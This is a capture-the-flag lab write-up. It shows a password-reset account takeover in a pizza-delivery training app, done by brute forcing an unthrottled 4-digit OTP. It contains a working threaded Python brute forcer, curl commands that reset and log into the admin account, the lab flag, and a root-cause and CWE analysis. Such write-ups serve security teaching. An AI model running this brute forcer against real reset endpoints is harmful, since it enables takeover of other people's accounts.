# cheesy-008 (Cheesy Does It - Premium Pizza Delivery) - BugForge Lab Walkthrough

**URL:** https://lab-1783235148078-wykzuv.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** No rate limiting on OTP verification (password reset account takeover)
**Flag:** `bug{dfCgKomuVXnKBWe6LVU67HTczPGzo2dN}`

---

## Summary

Cheesy Does It is a React/Express pizza ordering app with a three-step forgot-password flow: request an OTP, verify the OTP, then set a new password. The OTP is a 4-digit numeric code (10,000 possible values), and the verification endpoint has no rate limiting or lockout of any kind. The full keyspace can be brute forced in under two minutes with modest concurrency. Successful verification returns a reset token directly in the response body, which is then accepted unauthenticated by the password reset endpoint. This allows a full account takeover of any known username, including the admin account, with zero interaction from the victim.

## Tech Stack

- React SPA (Create React App), MUI components
- Express.js backend
- JWT-based auth (token stored in `localStorage`)
- SQLite (inferred from other labs in the same family)

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/register` | POST | None | Creates a new user |
| `/api/login` | POST | None | Returns JWT |
| `/api/forgot-password` | POST | None | Takes `username`, triggers OTP send, confirms/denies user existence |
| `/api/verify-otp` | POST | None | Takes `username` + `otp`, returns `reset_token` on success |
| `/api/reset-password` | POST | None | Takes `username` + `reset_token` + `new_password` |

## Attack Chain

1. Pulled the JS bundle (`main.<hash>.js`) and grepped for API routes, which surfaced the full password reset flow: `/api/forgot-password`, `/api/verify-otp`, `/api/reset-password`.
2. Reading the relevant component code in the bundle showed the client stores whatever `reset_token` comes back from `/api/verify-otp` and passes it straight to `/api/reset-password` on the next step, with no other authentication in between.
3. Registered a throwaway account to confirm the API shapes end to end.
4. Called `/api/forgot-password` for the throwaway account and got a generic success message with no OTP disclosed.
5. Sent a burst of 20 rapid requests to `/api/verify-otp` with a wrong OTP to check for rate limiting. All 20 returned `HTTP 400` with no throttling, delay, or lockout.
6. Wrote a small Python brute forcer using `requests` + `ThreadPoolExecutor` (40 workers) to try all 10,000 possible 4-digit OTPs against the throwaway account:

```python
import requests, concurrent.futures

TARGET = "https://lab-1783235148078-wykzuv.labs-app.bugforge.io"
USERNAME = "claudetest1"

def try_otp(otp):
    otp_str = f"{otp:04d}"
    r = requests.post(f"{TARGET}/api/verify-otp",
                       json={"username": USERNAME, "otp": otp_str}, timeout=5)
    if "Invalid or expired OTP" not in r.text:
        return (otp_str, r.text)

with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
    futures = {ex.submit(try_otp, i): i for i in range(10000)}
    for fut in concurrent.futures.as_completed(futures):
        res = fut.result()
        if res:
            print("HIT:", res)
```

Result:
```
HIT: ('6202', '{"reset_token":"4167b8a8-b28a-4955-bb6e-dce1f95abdd1"}')
```

7. Confirmed the target username was not tied to a special exception by checking `/api/forgot-password` for `admin`, which returned the same success message as any valid user. Ran the same brute forcer against `admin`:

```
HIT: ('8759', '{"reset_token":"ac7df462-4762-4ad8-b36c-e2ebc8061926"}')
```

8. Used the leaked token to reset the admin password:

```bash
curl -s -X POST "$TARGET/api/reset-password" -H "Content-Type: application/json" \
  -d '{"username":"admin","reset_token":"ac7df462-4762-4ad8-b36c-e2ebc8061926","new_password":"ClaudePwn123!"}'
# => {"message":"Password reset successfully"}
```

9. Logged in as admin with the new password:

```bash
curl -s -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"ClaudePwn123!"}'
# => {"token":"...","user":{"id":1,"username":"admin","email":"bug{dfCgKomuVXnKBWe6LVU67HTczPGzo2dN}",
#     "full_name":"Pizza Admin","phone":"555-0100","address":"bug{dfCgKomuVXnKBWe6LVU67HTczPGzo2dN}","role":"admin"}}
```

Flag retrieved from the admin user's `email` and `address` fields in the login response.

## Discovery Notes

- The JS bundle made the whole reset flow visible up front: request OTP, verify OTP, set password. That is a 3 step flow with 2 unauthenticated endpoints in between, which is exactly the kind of surface worth stress testing for missing rate limits.
- Checking for rate limiting with a small burst before committing to a full brute force is worth doing every time. It took only a few seconds and confirmed the endpoint had zero protection before spending time on a 10,000 request run.
- The `/api/forgot-password` response also doubles as a username enumeration oracle (`"User not found"` vs a generic success message), which made it trivial to confirm `admin` was a valid target before brute forcing its OTP.

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| Checking `/api/forgot-password` response for a leaked OTP | Generic `{"message":"OTP sent..."}` with nothing extra | OTP is not disclosed anywhere in the request/response cycle, brute force is required |
| Assuming the reset endpoint would require an active session or the OTP request's cookie/state | Reset endpoint accepted the token with a fresh, stateless request | No session binding between the three steps, only the token value matters |

## Root Causes

- The OTP verification endpoint has no rate limiting, throttling, or lockout after repeated failed attempts, making a 4 digit numeric OTP (10,000 possible values) trivially brute forceable in minutes.
- The reset token is returned directly in the `/api/verify-otp` response body rather than being delivered exclusively out of band (e.g. via a link only the account owner's email can receive), so brute forcing the OTP alone is sufficient to obtain a valid reset token with no access to the victim's inbox.
- `/api/forgot-password` leaks whether a username exists, giving an attacker a cheap way to confirm high value targets like `admin` before spending brute force effort.

## CWE / OWASP

- CWE-307: Improper Restriction of Excessive Authentication Attempts
- CWE-640: Weak Password Recovery Mechanism for Forgotten Password
- CWE-204: Observable Response Discrepancy (username enumeration via forgot-password)
- OWASP A07:2021: Identification and Authentication Failures
